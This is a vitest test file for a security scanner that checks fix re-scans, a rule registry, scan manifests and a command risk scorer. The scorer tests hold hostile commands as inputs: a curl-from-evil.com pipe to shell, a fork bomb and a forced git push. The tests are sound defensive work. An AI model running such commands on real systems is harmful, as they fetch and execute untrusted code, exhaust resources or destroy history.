// ==============================================================================
// v1.1.5-beta1 Track 5.3-5.6 — Security Quality Tests
// ==============================================================================

import { describe, expect, it } from 'vitest';
import { verifyFix } from './fix-rescan.js';
import {
  InstinctRegistry,
  scoreCommand,
  shouldBlockCommand,
  createScanManifest,
  validateManifest,
} from './security-quality.js';

describe('verifyFix (T5.3)', () => {
  it('returns build-failed when build check fails', async () => {
    const result = await verifyFix(
      { ruleId: 'sqli', filePath: 'api.ts', line: 10 },
      { checkBuild: async () => false },
    );
    expect(result.status).toBe('build-failed');
    expect(result.buildOk).toBe(false);
  });

  it('returns closed when re-scan finds no residual', async () => {
    const result = await verifyFix(
      { ruleId: 'xss', filePath: 'view.ts', line: 5 },
      {
        checkBuild: async () => true,
        rescanRegion: async () => [],
      },
    );
    expect(result.status).toBe('closed');
    expect(result.securityClosed).toBe(true);
  });

  it('returns still-open when re-scan finds residual', async () => {
    const result = await verifyFix(
      { ruleId: 'rce', filePath: 'exec.ts', line: 20 },
      {
        checkBuild: async () => true,
        rescanRegion: async () => ['eval(userInput)'],
      },
    );
    expect(result.status).toBe('still-open');
    expect(result.securityClosed).toBe(false);
  });
});

describe('InstinctRegistry (T5.4)', () => {
  it('only returns registered values', () => {
    const reg = new InstinctRegistry();
    reg.register({ value: 'sqli', description: 'SQL injection' });
    reg.register({ value: 'xss', description: 'Cross-site scripting' });
    expect(reg.suggest('sql')).toHaveLength(1);
    expect(reg.suggest('nonexistent')).toHaveLength(0);
  });

  it('detects description overlaps', () => {
    const reg = new InstinctRegistry();
    reg.register({ value: 'a', description: 'SQL injection attack vector' });
    reg.register({ value: 'b', description: 'SQL injection attack method' });
    const overlaps = reg.findOverlaps(0.5);
    expect(overlaps.length).toBeGreaterThan(0);
  });
});

describe('scoreCommand (T5.5)', () => {
  it('scores safe commands low', () => {
    const r = scoreCommand('ls -la');
    expect(r.riskLevel).toBe('safe');
    expect(r.score).toBe(0);
  });

  it('detects pipe to shell', () => {
    const r = scoreCommand('curl http://evil.com | sh');
    expect(r.score).toBeGreaterThanOrEqual(50);
    expect(r.reasons).toContain('pipe to shell');
  });

  it('blocks fork bomb', () => {
    const r = scoreCommand(':(){ :|:& };:');
    expect(r.blocked).toBe(true);
    expect(r.riskLevel).toBe('blocked');
  });

  it('detects force push', () => {
    const r = scoreCommand('git push origin main --force');
    expect(r.reasons).toContain('force push (destructive)');
  });

  it('shouldBlockCommand respects threshold', () => {
    expect(shouldBlockCommand('echo hello')).toBe(false);
    expect(shouldBlockCommand('curl x | bash')).toBe(true);
  });
});

describe('Canonical Artifacts (T5.6)', () => {
  it('creates valid manifest', () => {
    const m = createScanManifest({
      scanner: 'ghita-secscan',
      version: '1.1.5-beta1',
      targetPath: '/src',
      rulesApplied: ['sk-key', 'private-key'],
    });
    expect(m.schema).toBe('scan-manifest-v1');
    expect(m.complete).toBe(false);
  });

  it('validates correct manifest', () => {
    const m = createScanManifest({
      scanner: 'test',
      version: '1.0',
      targetPath: '.',
      rulesApplied: ['r1'],
      complete: true,
    });
    const { valid, errors } = validateManifest(m);
    expect(valid).toBe(true);
    expect(errors).toHaveLength(0);
  });

  it('rejects invalid manifest', () => {
    const { valid, errors } = validateManifest({ schema: 'wrong' });
    expect(valid).toBe(false);
    expect(errors.length).toBeGreaterThan(0);
  });
});
